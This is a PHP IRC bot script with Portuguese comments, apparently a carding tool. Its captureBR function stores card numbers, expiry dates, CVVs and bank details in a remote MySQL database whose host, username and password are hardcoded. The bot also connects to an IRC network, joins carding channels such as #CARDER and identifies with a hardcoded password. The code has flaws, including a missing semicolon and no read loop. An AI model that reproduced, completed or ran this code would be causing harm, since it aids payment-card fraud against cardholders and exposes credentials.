<?php
// Função do UPTIME
function Uptime(){
    $str   = @file_get_contents('/proc/uptime');
    $num   = floatval($str);
    $secs  = $num % 60;      $num = intdiv($num, 60);
    $mins  = $num % 60;      $num = intdiv($num, 60);
    $hours = $num % 24;      $num = intdiv($num, 24);
    $days  = $num;

    return $days." DIAS ".$hours." HORAS ".$mins." MINUTOS ".$secs." SEGUNDOS";
}

// FUNÇÃO DO CAPTURADOR
function captureBR($ccnr,$ccmes,$ccano,$cccvv,$ccbanco,$ccnivel,$cctipo,$ccbandeira,$ccnick){
    $DBHOSTNAME     =	"br17.dialhost.com.br";
    $DBUSERNAME     =	"chiarell_capture";
    $DBPASSWORD     =	"tChQX4qV$";
    $DBCAPTURE      =	"chiarell_capture";

    $mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBCAPTURE);
    if($mysqli->connect_error){
        echo "Desconectado! Erro: " . $mysqli->connect_error . "\n";
    }else{
        $inserir = $mysqli->query("INSERT INTO ccbrazil (cc_numero, cc_mes, cc_ano, cc_cvv, cc_banco, cc_nivel, cc_tipo, cc_bandeira, cc_nick) VALUES ('$ccnr', '$ccmes', '$ccano', '$cccvv', '$ccbanco', '$ccnivel', '$cctipo', '$ccbandeira', '$ccnick')");
        if(!$inserir){ echo 'Erro: ', $inserir->error . "\n"; }
    }
    mysqli_close($mysqli);
}

// VARIAVEIS
	$nickname   = 'CheckNet';
	$master     = 'Norah_C_IV';

// CONEXÃO COM O IRC.CHKNET.CC:6667
	$server = 'irc.chknet.cc';
	$port = 6667;
	$nickname = 'CheckNet';
	$ident = 'CheckNet';
	$gecos = 'CheckNet Bot V1.0 By Norah_C_IV';
	$channel = '#CARDER'

// EFETUANDO A CONEXÃO COM A REDE
	$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
	$error = socket_connect( $socket, $server, $port );

// ADICIONANDO TRATAMENTO DE ERRO P/CONEXAO MAL SUCEDIDA 
	if ( $socket === false ) {
		$errorCode = socket_last_error();
		$errorString = socket_strerror( $errorCode );
		die( "Error $errorCode: $errorString\n" );
	}

// ENVIANDO INFORMAÇÕES DE REGISTRO PARA A REDE
	socket_write( $socket, "NICK $nickname\r\n");
	socket_write( $socket, "USER $ident * 8 :$gecos\r\n" );

// FINAL DO LOOP
	// BUSCANDO DADOS DO SOCKET
	$data = trim( socket_read( $socket, 1024, PHP_NORMAL_READ ) );
	echo $data . "\n";
	// DIVIDINDO OS DADOS EM PEDAÇOS
	$ex = explode(' ', $data);
	// PREENCHIMENTO DO ARRAY PARA EVITAR ERROS
	$ex = array_pad( $ex, 10, '' );

// MANIPULADOR DE PING
    // PING : IRC.CHKNET.CC
    if ( $ex[0] === 'PING') {
    	socket_write( $socket, 'PONG ' . $ex[1] . "\r\n" );
    }
    if($ex[0] == ":NickServ!services@services.chknet" && $ex[4] == "accepted") {
       socket_write( $socket, "PRIVMSG NickServ :identify norah235144\r\n" );
       socket_write( $socket, 'JOIN ' . $channel . "\r\n" );
       socket_write( $socket, "JOIN #BRAZIL\n");
       socket_write( $socket, "JOIN #UNIX\n");
       socket_write( $socket, "JOIN #CCPOWER\n");
       socket_write( $socket, "JOIN #alternative\n");
       socket_write( $socket, "JOIN #check\n");
       socket_write( $socket, "JOIN #cctools\n");
       socket_write( $socket, "JOIN #jcheck\n");
    }


// SEPARAÇÃO DE NICK - IDENT - HOSTNAME [CheckNet~!CheckNet@CardingBotNetwork]
 if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$identdtmp = $hosttmp[0];
 }
 //    [0]                        [1]        [2]        [3]
 // :Nickname!ident@hostname    PRIVMSG   #CHANNEL   :!comand  
 if ( $ex[3] == '!comandos') {
 	$resposta = "10[_$nickCMD_] →01 COMANDOS DA SALA AQUI 07[ https://pastebin.pl/view/raw/140f8d1b ] ";
 	socket_write( $socket, 'PRIVMSG' . $ex[2] . " :$resposta\r\n" );
 }
 
?>
